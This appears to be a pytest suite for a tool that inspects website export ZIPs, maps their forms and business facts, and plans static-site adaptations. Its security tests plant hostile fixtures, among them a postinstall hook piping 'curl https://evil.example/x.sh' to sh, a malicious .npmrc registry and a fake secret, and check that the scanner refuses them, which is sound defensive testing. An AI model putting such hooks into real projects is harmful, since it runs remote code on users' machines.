"""H2 — the universal (family-based) source adapter: inspection, supportability,
form mapping, BusinessTruth discovery, the auditable adaptation plan,
determinism/idempotency and security detection.

Runs the real pipeline up to the plan (no install, no build, no execution of
the export) on the SYNTHETIC lumen-physio fixture and on variants of it.
The real Nexo export is exercised end to end by scripts/h2_e2e_qa.py.
"""

import hashlib
import json
import shutil
from pathlib import Path

import pytest

from app.creative.source_adapter import tsx_scan as ts
from app.creative.source_adapter.adapters import select_adapter
from app.creative.source_adapter.adapters.base import ExportOverlay, OverlayPatch
from app.creative.source_adapter.adapters.higgsfield_tanstack import ADAPTER
from app.creative.source_adapter.classify import SUPPORTED_WITH_REVIEW, UNSUPPORTED
from app.creative.source_adapter.fixtures import lumen_physio_business_config, zip_directory
from app.creative.source_adapter.forms import discover_forms, map_form
from app.creative.source_adapter.manifest import inspect_source
from app.creative.source_adapter.overlays import overlay_for
from app.creative.source_adapter.overlays.nexo_reformas import OVERLAY as NEXO_OVERLAY
from app.creative.source_adapter.pipeline import plan_export
from app.creative.source_adapter.plan import PlanDriftError, PlanRefusedError, VirtualTree, apply_plan, execute
from app.creative.source_adapter.records import AdapterError
from app.publishing.csp_policy import policy_for

FIXTURE = Path(__file__).parent / "fixtures" / "higgsfield_synthetic" / "lumen-physio"
ORIGIN = "https://lumen-physio.example"
SERVICES = {"sports-physiotherapy", "clinical-pilates", "osteopathy"}


def _zip(tmp_path: Path, edits: dict[str, str | bytes | None] | None = None, name: str = "v") -> Path:
    """The fixture (optionally modified) as a deterministic export ZIP."""
    source = tmp_path / name / "lumen-physio"
    shutil.copytree(FIXTURE, source)
    for rel, content in (edits or {}).items():
        target = source / rel
        if content is None:
            target.unlink()
            continue
        target.parent.mkdir(parents=True, exist_ok=True)
        if isinstance(content, bytes):
            target.write_bytes(content)
        else:
            target.write_text(content, encoding="utf-8")
    return zip_directory(source, tmp_path / f"{name}.zip")


def _plan(tmp_path: Path, edits=None, *, config=None, name: str = "v", ledger=None):
    zip_path = _zip(tmp_path, edits, name)
    work = tmp_path / f"{name}-work"
    config = config or lumen_physio_business_config()
    return work, plan_export(zip_path, work, config, site_origin=ORIGIN, fact_ledger=ledger)


def _refused(tmp_path: Path, edits, *, config=None) -> dict:
    """Plans a variant that must be refused; returns its supportability report."""
    zip_path = _zip(tmp_path, edits)
    work = tmp_path / "refused"
    with pytest.raises(PlanRefusedError):
        plan_export(zip_path, work, config or lumen_physio_business_config(), site_origin=ORIGIN)
    assert not (work / "adapted").exists() and not (work / "adaptation-plan.json").exists()  # nothing mutated
    return json.loads((work / "supportability.json").read_text(encoding="utf-8"))


def _read(rel: str) -> str:
    return (FIXTURE / rel).read_text(encoding="utf-8")


def _open_codes(report: dict) -> set[str]:
    return {f["code"] for f in report["findings"] if f["open"]}


def _writable_copy(source: Path, target: Path) -> Path:
    shutil.copytree(source, target)
    for path in [target, *target.rglob("*")]:
        path.chmod(0o755 if path.is_dir() else 0o644)
    return target


def _with_profile(**update):
    config = lumen_physio_business_config()
    return config.model_copy(update={"business_profile": config.business_profile.model_copy(update=update)})


# --- tsx_scan -------------------------------------------------------------------------------------


def test_the_lexer_is_not_fooled_by_braces_in_regexes_strings_and_comments():
    source = 'const re = /^[^@]+@[^@]{2,}$/;\nconst s = "{";\n// { comment\nconst o = { a: `x${1}y` };\n'
    scan = ts.scan(source)
    assert scan.masked.count("{") == scan.masked.count("}")
    assert [t.value for t in scan.strings] == ["{"]


def test_jsx_text_is_found_but_type_arguments_are_not():
    scan = ts.scan('const [s] = useState<Status>("idle");\nexport const A = () => <p className="x">Hola Lisboa</p>;\n')
    assert [scan.text[a:b] for a, b in ts.jsx_text_runs(scan)] == ["Hola Lisboa"]


def test_machine_values_are_not_visitor_text():
    scan = ts.scan(
        '<a className="brand" href="/x" title="Lumen Physio">x</a>; const o = { value: "cocina", name: "Cocina" };'
    )
    assert [t.value for t in scan.strings if ts.is_text_string(scan, t)] == ["Lumen Physio", "Cocina"]


# --- SourceManifest ----------------------------------------------------------------------------------


def test_the_manifest_is_deterministic_bound_to_the_snapshot_and_static(tmp_path):
    work, planned = _plan(tmp_path)
    app = work / "original" / "lumen-physio"
    again = inspect_source(app, snapshot_zip_sha256=planned.snapshot.zip_sha256, app_dir="lumen-physio")
    assert again.sha256 == planned.manifest.sha256
    written = json.loads((work / "source-manifest.json").read_text(encoding="utf-8"))
    assert written["manifest_sha256"] == planned.manifest.sha256
    assert written["snapshot"]["zip_sha256"] == planned.snapshot.zip_sha256
    assert str(tmp_path) not in json.dumps(written) and "cover-7f3a" not in json.dumps(written)  # origins only


def test_the_manifest_describes_the_export(tmp_path):
    _, planned = _plan(tmp_path)
    m = planned.manifest
    assert m.framework["router"] == "tanstack-file-routes" and m.package_manager["manager"] == "bun"
    assert {r["path"] for r in m.routes if r["live"]} == {None, "/", "/studio"}
    assert [f["form_id"] for f in m.forms] == ["src/features/landing/Contact.tsx#0"]
    assert {(f["family"], f["provider"]) for f in m.fonts} == {("Fraunces", "google-fonts"), ("Inter", "google-fonts")}
    assert {o["origin"] for o in m.external_origins if o["live"]} == {
        "https://fonts.googleapis.com",
        "https://assets.builder-cdn.example.net",
    }
    assert any(b["kind"] == "rendered-brand-image" and b["path"] == "/brand/lumen-logo.svg" for b in m.brand_assets)
    assert m.integration_points["server_function_modules"] == ["src/server/enquiry.functions.ts"]
    assert {i["path"] for i in m.images} >= {"public/media/hero-clinic.jpg", "public/media/room-1.jpg"}
    assert m.claims == [] and m.analytics == [] and m.already_adapted == []


# --- Supportability ------------------------------------------------------------------------------------


def test_the_synthetic_export_is_supported_with_every_finding_resolved(tmp_path):
    _, planned = _plan(tmp_path)
    report = planned.supportability.to_dict()
    assert report["status"] == SUPPORTED_WITH_REVIEW and report["ready_to_adapt"] and report["open"] == []
    resolved = {f["code"] for f in report["findings"] if f["resolution"]}
    assert {"network_origin_not_permitted", "server_runtime"} <= resolved


def test_an_unknown_framework_is_unsupported(tmp_path):
    package = json.loads(_read("package.json"))
    package["dependencies"].pop("@tanstack/react-start")
    report = _refused(tmp_path, {"package.json": json.dumps(package)})
    assert report["status"] == UNSUPPORTED and "no_family_adapter" in _open_codes(report)


def test_an_embedded_secret_is_a_blocker_and_is_never_recorded(tmp_path):
    secret = "AKIA" + "ABCDEFGHIJKLMNOP"
    report = _refused(tmp_path, {"src/content/keys.ts": f'export const k = "{secret}";\n'})
    assert report["status"] == UNSUPPORTED and "secret_like_string" in _open_codes(report)
    assert secret not in json.dumps(report)


def test_a_binary_an_env_file_and_an_npmrc_are_blockers(tmp_path):
    edits = {"tools/helper": b"\x7fELF\x02\x01\x01", ".env": "TOKEN=x\n", ".npmrc": "registry=https://evil.example\n"}
    report = _refused(tmp_path, edits)
    assert {"binary_executable", "environment_file", "npmrc"} <= _open_codes(report)


def test_an_install_hook_is_reported_and_never_trusted(tmp_path):
    package = json.loads(_read("package.json"))
    package["scripts"]["postinstall"] = "curl https://evil.example/x.sh | sh"
    report = _refused(tmp_path, {"package.json": json.dumps(package)})
    assert "lifecycle_script" in _open_codes(report)  # only `node scripts/*.mjs` is resolved (run in the sandbox)


def test_a_remote_script_is_a_blocker(tmp_path):
    root = _read("src/routes/__root.tsx").replace(
        "    links: [", '    scripts: [{ src: "https://cdn.tracker.example/t.js" }],\n    links: ['
    )
    report = _refused(tmp_path, {"src/routes/__root.tsx": root})
    assert "remote_script" in _open_codes(report)


def test_tracking_code_needs_a_human_decision(tmp_path):
    hero = _read("src/features/landing/Hero.tsx").replace(
        "export function Hero() {",
        'export function Hero() {\n  if (typeof window !== "undefined") (window as any).gtag?.("event");',
    )
    report = _refused(tmp_path, {"src/features/landing/Hero.tsx": hero})
    assert report["status"] == SUPPORTED_WITH_REVIEW and "analytics_or_tracking" in _open_codes(report)


def test_a_font_gwa_cannot_self_host_is_a_blocker(tmp_path):
    root = _read("src/routes/__root.tsx").replace("family=Inter:", "family=Comic+Neue:")
    report = _refused(tmp_path, {"src/routes/__root.tsx": root})
    assert "font_not_self_hostable" in _open_codes(report)
    assert "network_origin_not_permitted" in _open_codes(report)  # the CSP is never widened to Google


def test_a_dynamic_route_cannot_become_a_static_page(tmp_path):
    route = (
        'import { createFileRoute } from "@tanstack/react-router";\n\n'
        'export const Route = createFileRoute("/posts/$id")({\n  component: () => null,\n});\n'
    )
    report = _refused(tmp_path, {"src/routes/posts.$id.tsx": route})
    assert "dynamic_route_not_prerenderable" in _open_codes(report)


# --- Forms ---------------------------------------------------------------------------------------------

_NEXO_EQUIVALENT_FORM = """import { useState } from "react";

import { submitLead, type LeadInput } from "@/lib/api/leads.functions";

export function LeadForm() {
  const [reference, setReference] = useState<string>("");
  async function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
    const raw = new FormData(event.currentTarget);
    const payload = { name: String(raw.get("name")) } as LeadInput;
    const result = await submitLead({ data: payload });
    setReference(result.id.slice(0, 8));
  }
  return (
    <form className="nx-form" noValidate onSubmit={handleSubmit}>
      <Field label="Nombre" name="name"><input autoComplete="name" id="name" name="name" required type="text" /></Field>
      <Field label="Teléfono" name="phone">
        <input autoComplete="tel" id="phone" name="phone" required type="tel" />
      </Field>
      <Field label="Correo (opcional)" name="email"><input id="email" name="email" type="email" /></Field>
      <Field label="Superficie aproximada" name="area"><input id="area" name="area" type="text" /></Field>
      <Field label="Tipo de reforma" name="scope">
        <select id="scope" name="scope">{SCOPES.map((s) => <option key={s} value={s}>{s}</option>)}</select>
      </Field>
      <Field label="Qué quieres cambiar" name="notes"><textarea id="notes" name="notes" /></Field>
      <button type="submit">Pedir presupuesto</button>
    </form>
  );
}
"""


def test_a_nexo_equivalent_form_maps_every_field():
    [form] = discover_forms("src/lead-form.tsx", _NEXO_EQUIVALENT_FORM, {"@/lib/api/leads.functions"})
    assert form.transport.kind == "server-function" and form.transport.result_used  # the fabricated reference
    mapping = map_form(form, {"reforma-integral", "cocina"})
    assert {f.name: (f.role, f.key, f.label) for f in mapping.fields} == {
        "name": ("name", "name", "Nombre"),
        "phone": ("phone", "phone", "Teléfono"),
        "email": ("email", "email", "Correo (opcional)"),
        "area": ("detail", "area", "Superficie aproximada"),
        "scope": ("service", "service", "Tipo de reforma"),
        "notes": ("message", "notes", "Qué quieres cambiar"),
    }
    assert mapping.findings == []


def test_a_differently_named_and_ordered_form_maps_by_meaning(tmp_path):
    _, planned = _plan(tmp_path)
    [mapping] = planned.plan.form_mappings
    assert [(f["name"], f["role"], f["key"]) for f in mapping["fields"]] == [
        ("fullName", "name", "full_name"),
        ("treatment", "service", "service"),
        ("contactEmail", "email", "contact_email"),
        ("telephone", "phone", "telephone"),
        ("preferredTime", "detail", "preferred_time"),
        ("message", "message", "message"),
        ("acceptPrivacy", "consent", "accept_privacy"),
    ]
    assert mapping["findings"] == []


def _form(fields: str, transport: str) -> str:
    return (
        'import { sendEnquiry } from "../server/enquiry.functions";\n'
        "export function F() {\n"
        f"  async function go(values: Record<string, string>) {{ {transport} }}\n"
        f"  return <form onSubmit={{() => go({{}})}}>{fields}</form>;\n"
        "}\n"
    )


_SEND = "await sendEnquiry({ data: values });"


@pytest.mark.parametrize(
    ("fields", "transport", "code", "severity"),
    [
        ('<input name="name" /><textarea name="message" />', _SEND, "form_without_contact_field", "blocker"),
        ('<input name="a" type="email" /><input name="b" type="email" />', _SEND, "form_role_ambiguous", "review"),
        (
            '<input name="email" type="email" /><input name="vat_code" required />',
            _SEND,
            "form_required_field_unrecognized",
            "review",
        ),
        ('<input name="email" type="email" /><input name={dynamic} />', _SEND, "form_field_dynamic_name", "review"),
        (
            '<input name="email" type="email" />',
            'await fetch("/api", { method: "POST" });',
            "form_transport_unmappable",
            "blocker",
        ),
    ],
)
def test_ambiguous_or_unsupported_forms_are_findings_never_guesses(fields, transport, code, severity):
    [form] = discover_forms("src/F.tsx", _form(fields, transport), {"../server/enquiry.functions"})
    mapping = map_form(form, SERVICES)
    assert (code, severity) in {(f["code"], f["severity"]) for f in mapping.findings}
    kept = {f.name for f in mapping.fields}
    assert all(f.name in kept for f in form.fields if f.name)  # every named field is kept — no data loss


# --- BusinessTruth ------------------------------------------------------------------------------------


def test_business_facts_are_discovered_not_assumed(tmp_path):
    _, planned = _plan(tmp_path)
    bindings = {b["field"]: b for b in planned.plan.fact_bindings}
    assert set(bindings) == {"identity.name", "location.city", *(f"services.{s}" for s in SERVICES)}
    assert not any(b["changes_text"] for b in bindings.values())
    assert not [op for op in planned.plan.operations if op.category == "business-truth"]  # equal: nothing edited


def test_a_renamed_service_binds_to_its_id_and_changes_the_text(tmp_path):
    config = lumen_physio_business_config()
    services = [
        s.model_copy(update={"name": "Osteopathy and manual therapy"}) if s.id == "osteopathy" else s
        for s in config.business_profile.services
    ]
    _, planned = _plan(tmp_path, config=_with_profile(services=services))
    ops = [op for op in planned.plan.operations if op.category == "business-truth"]
    assert ops and all("Osteopathy and manual therapy" in (op.replace or "") for op in ops)
    assert {op.path for op in ops} == {"src/content/site.ts", "src/features/landing/Contact.tsx"}


def test_a_presented_service_missing_from_business_truth_is_a_blocker(tmp_path):
    services = [s for s in lumen_physio_business_config().business_profile.services if s.id != "osteopathy"]
    report = _refused(tmp_path, None, config=_with_profile(services=services))
    assert "service_not_in_business_truth" in _open_codes(report)


def test_the_fact_ledger_carries_a_changed_fact_to_where_the_export_wrote_it(tmp_path):
    location = lumen_physio_business_config().business_profile.location.model_copy(update={"city": "Porto"})
    moved = _with_profile(location=location)
    _, without = _plan(tmp_path, config=moved, name="a")
    assert "location.city" not in {b["field"] for b in without.plan.fact_bindings}  # reported, never guessed
    assert any(f.code == "truth_fact_not_presented" for f in without.supportability.findings)
    ledger = without.plan.fact_ledger | {"location.city": "Lisbon"}
    _, with_ledger = _plan(tmp_path, config=moved, name="b", ledger=ledger)
    [city] = [b for b in with_ledger.plan.fact_bindings if b["field"] == "location.city"]
    assert city["literal"] == "Lisbon" and city["value"] == "Porto" and city["changes_text"]


def test_unverified_factual_claims_and_contacts_stop_the_adapter(tmp_path):
    site = _read("src/content/site.ts").replace(
        'lead: "Assessment first, then a plan you can follow between sessions."',
        'lead: "Over 500 patients treated. Rated 4.9/5. Write to hola@lumen.example."',
    )
    report = _refused(tmp_path, {"src/content/site.ts": site})
    codes = {(f["code"], f["severity"]) for f in report["findings"] if f["open"]}
    assert ("unverified_factual_claim", "review") in codes and ("unverified_contact_claim", "blocker") in codes


# --- AdaptationPlan: audit, determinism, idempotency ------------------------------------------------------


def test_the_plan_is_auditable_and_every_change_is_an_operation(tmp_path):
    work, planned = _plan(tmp_path)
    plan = json.loads((work / "adaptation-plan.json").read_text(encoding="utf-8"))
    assert plan["plan_sha256"] == planned.plan.plan_sha256
    assert plan["adapter"] == {
        "adapter_id": "higgsfield-tanstack-static",
        "version": "1.0.0",
        "contract_version": "1.0.0",
        "family": "higgsfield-tanstack-static",
    }
    assert plan["overlay"] is None  # a synthetic export: no reviewed overlay, family adapter only
    for op in plan["operations"]:
        assert op["category"] and op["reason"] and op["origin"].startswith("family:")
        assert op.get("before_sha256") or op.get("after_sha256")
    removed = {op["path"] for op in plan["operations"] if op["action"] == "remove"}
    assert removed == {"src/server/enquiry.functions.ts", "src/server/db.server.ts"}
    assert plan["csp"]["requested"] == {"media_blob": False, "style_origins": [], "font_origins": []}
    assert plan["build"]["expected_pages"] == [
        "cookies/index.html",
        "index.html",
        "privacy/index.html",
        "studio/index.html",
        "terms/index.html",
    ]
    assert [s["argv"] for s in plan["build"]["sandbox_steps"]] == [["bun", "run", "build"]]


def test_the_plan_wires_the_form_through_the_platform_transport(tmp_path):
    work, planned = _plan(tmp_path)
    tree = VirtualTree.from_dir(work / "original" / "lumen-physio")
    for op in planned.plan.operations:  # an independent dry run of the recorded operations
        tree.put(op.path, execute(tree._files.get(op.path), op))
    assert tree.tree_sha256() == planned.plan.adapted_tree_sha256
    contact = tree.text("src/features/landing/Contact.tsx")
    assert 'from "../../platform/lead-transport"' in contact and 'data-gwa-lead-form="lead-1"' in contact
    assert 'name="hp_field"' in contact and "sendEnquiry({ data: values })" in contact  # the form's own code stays
    shim = tree.text("src/platform/lead-transport.ts")
    assert "export async function sendEnquiry" in shim and "export type EnquiryInput" in shim
    assert '"role": "consent"' in shim and '"key": "preferred_time"' in shim
    assert "src={BUSINESS.logo.src}" in tree.text("src/features/landing/SiteHeader.tsx")
    assert "<LegalLinks />" in tree.text("src/features/landing/SiteFooter.tsx")
    root = tree.text("src/routes/__root.tsx")
    assert "fonts.googleapis.com" not in root and "@fontsource/fraunces/600.css?url" in root
    assert "prerender: { enabled: true" in tree.text("vite.config.ts")
    assert json.loads(tree.text("src/app-meta.json"))["og_image_url"] == f"{ORIGIN}/og-image.jpg"


def test_the_same_inputs_always_produce_the_same_plan(tmp_path):
    _, first = _plan(tmp_path, name="a")
    _, second = _plan(tmp_path, name="b")
    assert first.snapshot.zip_sha256 == second.snapshot.zip_sha256
    assert first.plan.plan_sha256 == second.plan.plan_sha256
    assert first.plan.adapted_tree_sha256 == second.plan.adapted_tree_sha256


def test_a_plan_applies_once_and_never_twice(tmp_path):
    work, planned = _plan(tmp_path)
    copy = _writable_copy(work / "original" / "lumen-physio", tmp_path / "copy")
    apply_plan(copy, planned.plan)
    adapted = VirtualTree.from_dir(copy).tree_sha256()
    assert adapted == planned.plan.adapted_tree_sha256
    with pytest.raises(PlanDriftError):
        apply_plan(copy, planned.plan)  # no SDK/consent/legal/metadata/form wiring is ever duplicated
    assert VirtualTree.from_dir(copy).tree_sha256() == adapted


def test_a_drifted_working_copy_is_refused_before_any_write(tmp_path):
    work, planned = _plan(tmp_path)
    copy = _writable_copy(work / "original" / "lumen-physio", tmp_path / "copy")
    (copy / "src/content/site.ts").write_text("export const site = {};\n", encoding="utf-8")
    before = VirtualTree.from_dir(copy).tree_sha256()
    with pytest.raises(PlanDriftError):
        apply_plan(copy, planned.plan)
    assert VirtualTree.from_dir(copy).tree_sha256() == before


def test_an_already_adapted_source_is_refused(tmp_path):
    work, planned = _plan(tmp_path)
    adapted = _writable_copy(work / "original" / "lumen-physio", tmp_path / "again" / "lumen-physio")
    apply_plan(adapted, planned.plan)
    zip_path = zip_directory(adapted, tmp_path / "again.zip")
    with pytest.raises(PlanRefusedError):
        plan_export(zip_path, tmp_path / "again-work", lumen_physio_business_config(), site_origin=ORIGIN)
    report = json.loads((tmp_path / "again-work" / "supportability.json").read_text(encoding="utf-8"))
    assert report["status"] == UNSUPPORTED and "already_adapted" in _open_codes(report)


def test_the_original_snapshot_is_never_modified(tmp_path):
    work, planned = _plan(tmp_path)
    original = work / "original"
    assert all(not (p.stat().st_mode & 0o222) for p in original.rglob("*") if p.is_file())
    assert {f.path: f.sha256 for f in planned.snapshot.files} == {
        p.relative_to(original).as_posix(): hashlib.sha256(p.read_bytes()).hexdigest()
        for p in original.rglob("*")
        if p.is_file()
    }


# --- Adapter contract, overlays, CSP --------------------------------------------------------------------


def test_adapter_selection_is_by_detection_and_csp_stays_inside_the_family_policy(tmp_path):
    work, planned = _plan(tmp_path)
    assert select_adapter(planned.manifest) is ADAPTER
    requested = ADAPTER.csp_requirements(planned.manifest, VirtualTree.from_dir(work / "original" / "lumen-physio"))
    policy = policy_for(ADAPTER.family)
    assert set(requested.style_origins) <= set(policy.style_origins) and not requested.media_blob


def test_overlays_are_selected_only_by_snapshot_sha_and_every_resolution_is_backed_by_a_patch(tmp_path):
    zip_path = _zip(tmp_path)
    assert overlay_for(hashlib.sha256(zip_path.read_bytes()).hexdigest()) is None
    assert overlay_for(NEXO_OVERLAY.snapshot_zip_sha256) is NEXO_OVERLAY
    with pytest.raises(AdapterError):
        ExportOverlay(name="x", snapshot_zip_sha256="0" * 64, reviewed="t", resolutions={"a:b": "claimed"})
    ExportOverlay(
        name="y",
        snapshot_zip_sha256="0" * 64,
        reviewed="t",
        resolutions={"a:b": "done"},
        patches=(OverlayPatch("f", "x", "y", "r", resolves=("a:b",)),),
    )


def test_a_form_that_displays_a_server_id_is_a_blocker_no_approval_can_fix(tmp_path):
    """R5: the platform transport returns no id, so only a reviewed overlay
    fix for that exact export can resolve this — never an approval."""
    contact = _read("src/features/landing/Contact.tsx").replace(
        "      await sendEnquiry({ data: values });\n      setState(\"done\");",
        "      const result = await sendEnquiry({ data: values });\n      console.log(result.fields);\n"
        "      setState(\"done\");",
    )
    report = _refused(tmp_path, {"src/features/landing/Contact.tsx": contact})
    finding = next(f for f in report["findings"] if f["code"] == "form_displays_server_identifier")
    assert finding["severity"] == "blocker" and finding["open"] and report["status"] == UNSUPPORTED
